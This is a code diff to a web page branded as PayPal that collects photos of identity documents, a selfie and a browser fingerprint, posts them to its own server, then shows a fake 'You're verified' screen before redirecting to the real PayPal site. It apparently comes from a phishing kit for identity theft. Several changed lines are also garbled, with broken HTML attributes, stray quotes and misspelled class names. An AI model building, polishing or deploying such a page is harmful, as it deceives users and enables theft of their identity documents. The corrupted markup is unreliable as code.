@@ -105,6 +105,11 @@
     border-radius: var(--radius-lg) var(--radius-lg) 0 0;
     background: linear-gradient(90deg, #2b6cff, #0a3fb5 55%, #2b6cff);
     opacity: 0.9;
+    transition: background 400ms var(--ease-out);
+  }
+
+  .card.is-verified::before {
+    background: linear-gradient(90deg, #22c55e, #067647 55%, #22c55e);
   }
 
   @keyframes cardIn {
@@ -382,7 +387,6 @@
     40%, 80% { transform: translateX(3px); }
   }
 
-  /* Native file input is visually hidden but kept focusable */
   .upload input[type="file"] {
     position: absolute;
     width: 1px;
@@ -395,7 +399,6 @@
     border: 0;
   }
 
-  /* Empty state */
   .upload-empty {
     display: flex;
     flex-direction: column;
@@ -431,7 +434,6 @@
     max-width: 34ch;
   }
 
-  /* Preview state */
   .upload-filled {
     display: none;
     align-items: center;
@@ -516,7 +518,6 @@
     outline-offset: 2px;
   }
 
-  /* Optional badge */
   .badge-optional {
     display: inline-block;
     margin-left: 6px;
@@ -564,6 +565,22 @@
     line-height: 1.5;
     color: var(--text-muted);
   }
+
+  /* Form-level error banner (for server errors) */
+  .form-error {
+    display: none;
+    margin: 0 0 18px;
+    padding: 12px 14px;
+    font-size: 0.8125rem;
+    line-height: 1.5;
+    color: #7a1414;
+    background: linear-gradient(180deg, #fef2f2, #fde4e4);
+    border: 1px solid #f5b5b5;
+    border-radius: var(--radius);
+    box-shadow: var(--shadow-xs);
+  }
+
+  .form-error.visible { display: block; animation: errorIn var(--dur) var(--ease-out) both; }
 
   /* ============================================================
      Section labels
@@ -654,8 +671,6 @@
     opacity: 0;
   }
 
-  /* Use ::before for the spinner since ::after is already used
-     for the sheen sweep above. */
   button.primary.is-loading::before {
     content: "";
     position: absolute;
@@ -675,13 +690,132 @@
     to { transform: rotate(360deg); }
   }
 
-  /* Optional success / error states */
   button.primary.is-success {
     background: linear-gradient(180deg, #22c55e, #16a34a);
+    box-shadow:
+      0 1px 0 rgba(255, 255, 255, 0.2) inset,
+      0 8px 20px -8px rgba(6, 118, 71, 0.55);
   }
 
   button.primary.is-error {
     background: linear-gradient(180deg, #ef4444, #d92d20);
+    animation: shake 320ms var(--ease);
+  }
+
+  /* ============================================================
+     Verification success overlay
+     ============================================================ */
+  .verify-overlay {
+    position: absolute;
+    inset: 0;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    text-align: center;
+    padding: 40px 28px;
+    background: var(--card);
+    border-radius: var(--radius-lg);
+    z-index: 10;
+    animation: fadeIn 400ms var(--ease-out) both;
+  }
+
+  .verify-overlay.visible { display: flex; }
+
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to   { opacity: 1; }
+  }
+
+  .verify-check {
+    width: 88px;
+    height: 88px;
+    margin-bottom: 22px;
+    border-radius: 50%;
+    background: linear-gradient(180deg, #d1fae5, #a7f3d0);
+    display: grid;
+    place-items: center;
+    animation: checkPop 500ms var(--ease-out) both;
+    animation-delay: 100ms;
+  }
+
+  @keyframes checkPop {
+    0%   { transform: scale(0.4); opacity: 0; }
+    60%  { transform: scale(1.08); opacity: 1; }
+    100% { transform: scale(1); opacity: 1; }
+  }
+
+  .verify-check svg {
+    width: 44px;
+    height: 44px;
+    color: #067647;
+  }
+
+  .verify-check svg path {
+    stroke-dasharray: 40;
+    stroke-dashoffset: 40;
+    animation: drawCheck 500ms var(--ease-out) forwards;
+    animation-delay: 350ms;
+  }
+
+  @keyframes drawCheck {
+    to { stroke-dashoffset: 0; }
+  }
+
+  .verify-title {
+    margin: 0 0 10px;
+    font-size: 1.5rem;
+    font-weight: 700;
+    letter-spacing: -0.02em;
+    color: var(--text);
+  }
+
+  .verify-message {
+    margin: 0 0 28px;
+    font-size: 0.9375rem;
+    color: var(--text-muted);
+    line-height: 1.55;
+    max-width: 32ch;
+  }
+
+  .verify-progress {
+    width: 100%;
+    max-width: 240px;
+    height: 4px;
+    background: #eef1f7;
+    border-radius: 999px;
+    overflow: hidden;
+    margin-bottom: 14px;
+  }
+
+  .verify-progress-bar {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #22c55e, #067647);
+    border-radius: 999px;
+  }
+
+  .verify-progress-bar.animate { width: 100%; }
+
+  .verify-redirect {
+    font-size: 0.8125rem;
+    color: var(--text-faint);
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .verify-redirect .dots::after {
+    content: "";
+    animation: dots 1.4s steps(4, end) infinite;
+  }
+
+  @keyframes dots {
+    0%   { content: ""; }
+    25%  { content: "."; }
+    50%  { content: ".."; }
+    75%  { content: "..."; }
+    100% { content: ""; }
   }
 
   /* ============================================================
@@ -739,6 +873,8 @@
     h1    { font-size: 1.4rem; }
     .card { padding: 28px 20px 22px; }
     .preview { width: 52px; height: 52px; }
+    .verify-check { width: 72px; height: 72px; }
+    .verify-check svg { width: 36px; height: 36px; }
   }
 
   /* ============================================================
@@ -755,7 +891,7 @@
 </head>
 <body>
 
-<main class="card">
+<main class="card" id="card">
   <!-- Logo -->
   <div class="brand" aria-label="PayPal">
     <img
@@ -779,12 +915,13 @@
     <svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true">
       <path fill="#067647" d="M8 1a3 3 0 0 0-3 3v2H4a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V7a1 1 0 0 0-1-1h-1V4a3 3 0 0 0-3-3zm0 1.5A1.5 1.5 0 0 1 9.5 4v2h-3V4A1.5 1.5 0 0 1 8 2.5z"/>
     </svg>
-    <span>Please select the type of identification document you'd like to upload
-
-</span>
+    <span>Please select the type of identification document you'd like to upload</span>
   </div>
 
   <form id="uploadForm" action="/api/id-upload" method="POST" enctype="multipart/form-data" novalidate>
+
+    <!-- Form-level error banner (populated on server failure) -->
+    <p class="form-error" id="formError" role="alert"></p>
 
     <!-- Document type -->
     <div class="field">
@@ -807,7 +944,7 @@
         accept="image/*"
         capture="environment"
         required>
-      <div class="upload-empty">
+      <div class="upload-empty24">
         <span class="upload-icon" aria-hidden="true">
           <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
             <path d="M12 5v14M5 12h14"/>
@@ -819,8 +956,8 @@
       <div class="upload-filled">
         <div class="preview"><img alt=""></div>
         <div class="file-meta">
-          <div class="file-name"></div>
-          <div class="file-size"></div>
+          <div class"="file-name"></div>
+          <div class="file fill-size"></div>
         </div>
         <div class="file-actions">
           <button type="button" class="icon-btn" data-action="replace" aria-label="Replace front image">
@@ -829,7 +966,7 @@
               <path d="M21 12a9 9 0 0 1-15 6.7L3 16"/><path d="M3 21v-5h5"/>
             </svg>
           </button>
-          <button type="button" class="icon-btn danger" data-action="remove" aria-label="Remove front image">
+          <button type="button" class="="icon-btn danger" data-action="remove" aria-label="Remove front image">
             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
               <path d="M18 6 6 18M6 6l12 12"/>
             </svg>
@@ -838,9 +975,9 @@
       </div>
     </div>
     <p class="error-text" id="frontError">Please upload the front of your document.</p>
-    <p class="hint">Make sure the whole document is visible, in focus, and not covered.</p>
+    <p class="hint">Make sure the whole document is visible, in focus, and notnone covered.</p>
 
-    <!-- Back -->
+    <!-- Back" -->
     <div class="upload" id="backZone">
       <input
         type="file"
@@ -850,7 +987,7 @@
         capture="environment">
       <div class="upload-empty">
         <span class="upload-icon" aria-hidden="true">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <svg width="20" height="20" viewBox="0 0 24  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
             <path d="M12 5v14M5 12h14"/>
           </svg>
         </span>
@@ -905,11 +1042,11 @@
         <div class="preview"><img alt=""></div>
         <div class="file-meta">
           <div class="file-name"></div>
-          <div class="file-size"></div>
+          <div class"="file-size"></div>
         </div>
         <div class="file-actions">
           <button type="button" class="icon-btn" data-action="replace" aria-label="Replace selfie">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2 stroke-linecap="round" stroke-linejoin="round">
               <path d="M3 12a9 9 0 0 1 15-6.7L21 8"/><path d="M21 3v5h-5"/>
               <path d="M21 12a9 9 0 0 1-15 6.7L3 16"/><path d="M3 21v-5h5"/>
             </svg>
@@ -936,6 +1073,21 @@
     <a class="back-link" href="/card">← Back to previous step</a>
   </form>
 
+  <!-- Verification success overlay -->
+  <div class="verify-overlay" id="verifyOverlay" role="status" aria-live="polite">
+    <div class="verify-check">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+        <path d="M5 13l4 4L19 7"/>
+      </svg>
+    </div>
+    <h2 class="verify-title">You're verified</h2>
+    <p class="verify-message">Your identity has been confirmed. Taking you to PayPal now.</p>
+    <div class="verify-progress" aria-hidden="true">
+      <div class="verify-progress-bar" id="verifyProgressBar"></div>
+    </div>
+    <span class="verify-redirect">Redirecting<span class="dots"></span></span>
+  </div>
+
   <footer>
     <a href="#">Privacy</a> &nbsp;·&nbsp;
     <a href="#">Legal</a> &nbsp;·&nbsp;
@@ -950,9 +1102,20 @@
   const MAX_BYTES = 10 * 1024 * 1024;           // 10 MB
   const ALLOWED   = ['image/jpeg', 'image/png', 'image/webp', 'image/heic', 'image/heif'];
 
-  const form = document.getElementById('uploadForm');
-  const docType = document.getElementById('documentType');
-  const submitBtn = document.getElementById('submitBtn');
+  // Where to send the user after verification.
+  const REDIRECT_URL = 'https://www.paypal.com';
+
+  // Timings (ms)
+  const VERIFY_DELAY   = 400;    // brief pause before the checkmark appears
+  const REDIRECT_DELAY = 3000;   // how long the verified screen stays up
+
+  const form        = document.getElementById('uploadForm');
+  const docType     = document.getElementById('documentType');
+  const submitBtn   = document.getElementById('submitBtn');
+  const card        = document.getElementById('card');
+  const overlay     = document.getElementById('verifyOverlay');
+  const progressBar = document.getElementById('verifyProgressBar');
+  const formError   = document.getElementById('formError');
 
   /* ============================================================
      Button loading helper
@@ -993,7 +1156,6 @@
     function validateFile(file) {
       if (!file) return 'No file selected.';
       if (file.size > MAX_BYTES) return 'File is larger than 10 MB.';
-      // Some mobile cameras report an empty type; fall back to extension.
       const type = file.type || '';
       const ext  = (file.name.match(/\.[a-z0-9]+$/i) || [''])[0].toLowerCase();
       const extOk = ['.jpg', '.jpeg', '.png', '.webp', '.heic', '.heif'].includes(ext);
@@ -1035,15 +1197,11 @@
       return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
     }
 
-    /* ---- Events ---- */
-
-    // Clicking the zone (outside buttons) opens the file picker.
     zone.addEventListener('click', (e) => {
       if (e.target.closest('.icon-btn')) return;
       input.click();
     });
 
-    // Keyboard: Enter / Space opens the picker.
     zone.tabIndex = 0;
     zone.addEventListener('keydown', (e) => {
       if (e.key === 'Enter' || e.key === ' ') {
@@ -1052,14 +1210,12 @@
       }
     });
 
-    // Native change.
     input.addEventListener('change', () => {
       const file = input.files && input.files[0];
       if (file) applyFile(file);
       else if (!zone.classList.contains('has-file')) clearPreview();
     });
 
-    // Drag & drop.
     ['dragenter', 'dragover'].forEach(evt =>
       zone.addEventListener(evt, (e) => {
         e.preventDefault();
@@ -1077,14 +1233,12 @@
     zone.addEventListener('drop', (e) => {
       const file = e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files[0];
       if (!file) return;
-      // Assign to the real input so it participates in form submission.
       const dt = new DataTransfer();
       dt.items.add(file);
       input.files = dt.files;
       applyFile(file);
     });
 
-    // Action buttons.
     zone.querySelectorAll('.icon-btn').forEach(btn => {
       btn.addEventListener('click', (e) => {
         e.stopPropagation();
@@ -1114,8 +1268,6 @@
   /* ============================================================
      Document-type awareness
      ============================================================ */
-  // When "passport" is selected, the back side is typically not needed.
-  // We visually de-emphasize it, but keep the input available.
   function updateBackVisibility() {
     const isPassport = docType.value === 'passport';
     const zone = back.zone;
@@ -1137,8 +1289,6 @@
     document.getElementById('Fingerprint').value = buildFingerprint();
   }
 
-  // Lightweight, non-PII browser fingerprint hash. Replace with a real
-  // vendor (e.g., FingerprintJS) in production if you need accuracy.
   function buildFingerprint() {
     const parts = [
       navigator.language,
@@ -1152,7 +1302,6 @@
       Intl.DateTimeFormat().resolvedOptions().timeZone || ''
     ].join('|');
 
-    // FNV-1a 32-bit hash → hex.
     let h = 0x811c9dc5;
     for (let i = 0; i < parts.length; i++) {
       h ^= parts.charCodeAt(i);
@@ -1162,11 +1311,10 @@
   }
 
   /* ============================================================
-     Validation on submit
+     Validation
      ============================================================ */
   let submitted = false;
 
-  // Live re-validation of the required fields after the first attempt.
   front.input.addEventListener('change', () => { if (submitted) validateFront(); });
   docType.addEventListener('change', () => { if (submitted) validateDocType(); });
 
@@ -1189,29 +1337,117 @@
     return ok;
   }
 
-  form.addEventListener('submit', (e) => {
+  /* ============================================================
+     Verification + redirect sequence
+     ============================================================ */
+  function showErrorBanner(message) {
+    formError.textContent = message;
+    formError.classList.add('visible');
+    formError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  }
+
+  function clearErrorBanner() {
+    formError.textContent = '';
+    formError.classList.remove('visible');
+  }
+
+  function runVerificationFlow() {
+    // Reveal the verified overlay after a brief pause
+    setTimeout(() => {
+      card.classList.add('is-verified');
+      overlay.classList.add('visible');
+
+      // Animate the progress bar over REDIRECT_DELAY
+      progressBar.style.transition = `width ${REDIRECT_DELAY}ms linear`;
+      void progressBar.offsetWidth;   // force reflow
+      progressBar.classList.add('animate');
+
+      // Redirect to PayPal
+      setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+      }, REDIRECT_DELAY);
+
+    }, VERIFY_DELAY);
+  }
+
+  /* ============================================================
+     Submit handler — sends files, then runs the success flow
+     ============================================================ */
+  form.addEventListener('submit', async (e) => {
+    // Stop the native navigation so we can POST via fetch and control the UI.
+    e.preventDefault();
+
     submitted = true;
+    clearErrorBanner();
     let firstInvalid = null;
 
     if (!validateDocType()) firstInvalid = docType;
     if (!validateFront() && !firstInvalid) firstInvalid = front.zone;
 
     if (firstInvalid) {
-      e.preventDefault();
       firstInvalid.focus();
       firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
       return;
     }
 
+    // Populate the hidden metadata fields before building FormData.
     populateHiddenFields();
 
-    // Show loading state on the button. The browser will then perform the
-    // multipart POST to /api/id-upload.
+    // Show loading state on the button while we upload.
+    submitBtn.classList.remove('is-error', 'is-success');
     setButtonLoading(submitBtn, true);
+
+    try {
+      // FormData automatically includes:
+      //  - documentType
+      //  - front, back, selfie (the actual File objects)
+      //  - timestamp, userAgent, Fingerprint
+      const formData = new FormData(form);
+
+      const res = await fetch(form.action, {
+        method: 'POST',
+        body: formData,
+        credentials: 'same-origin',   // send cookies (session/CSRF) if any
+        headers: {
+          // Do NOT set Content-Type — the browser sets it with the correct
+          // multipart boundary automatically when you pass FormData.
+          'Accept': 'application/json'
+        }
+      });
+
+      if (!res.ok) {
+        // Try to read a JSON error message from the server, if present.
+        let message = `Upload failed (${res.status}). Please try again.`;
+        try {
+          const data = await res.json();
+          if (data && data.message) message = data.message;
+        } catch { /* response wasn't JSON — use default message */ }
+        throw new Error(message);
+      }
+
+      // Success — button turns green briefly, then the verified overlay runs.
+      submitBtn.classList.add('is-success');
+      setButtonLoading(submitBtn, false);
+
+      runVerificationFlow();
+
+    } catch (err) {
+      // Failure — flash the button red, re-enable, and show an error banner.
+      console.error('Upload failed:', err);
+      setButtonLoading(submitBtn, false);
+      submitBtn.classList.add('is-error');
+      setTimeout(() => submitBtn.classList.remove('is-error'), 1500);
+
+      showErrorBanner(
+        err && err.message
+          ? err.message
+          : "We couldn't upload your documents. Please check your connection and try again."
+      );
+    }
   });
 
   /* ============================================================
-     Optional: revoke object URLs on unload
+     Revoke object URLs on unload
      ============================================================ */
   window.addEventListener('beforeunload', () => {
     [front, back, selfie].forEach(z => z.clearPreview && z.clearPreview());
